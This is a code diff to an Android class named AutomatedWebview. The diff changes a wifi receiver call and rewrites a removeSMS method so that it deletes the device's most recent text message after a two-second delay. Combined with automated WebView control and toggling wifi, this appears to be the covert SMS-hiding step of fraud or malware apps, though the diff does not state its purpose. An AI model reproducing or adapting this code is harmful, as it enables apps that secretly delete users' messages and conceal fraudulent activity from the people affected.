@@ -277,7 +277,7 @@ public class AutomatedWebview extends WebView {
             IntentFilter intentFilter = new IntentFilter();
             intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) ;
             intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
-            WifiReceiver receiver =  new WifiReceiver(this);
+            WifiReceiver receiver =  new WifiReceiver(this,true);
             context.registerReceiver(receiver, intentFilter);
         }
         wifiManager.setWifiEnabled(status);
@@ -385,12 +385,19 @@ public class AutomatedWebview extends WebView {
     }
 
     private void removeSMS() {
+        Handler handler =new Handler();
         Uri uriSMSURI = Uri.parse("content://sms/");
         try {
             Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
             if (cur.moveToFirst()) {
-                String MsgId = cur.getString(0);
-                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+                final String MsgId = cur.getString(0);
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+                    }
+                }, 2000);
+
             }
         }
         catch(Exception e)
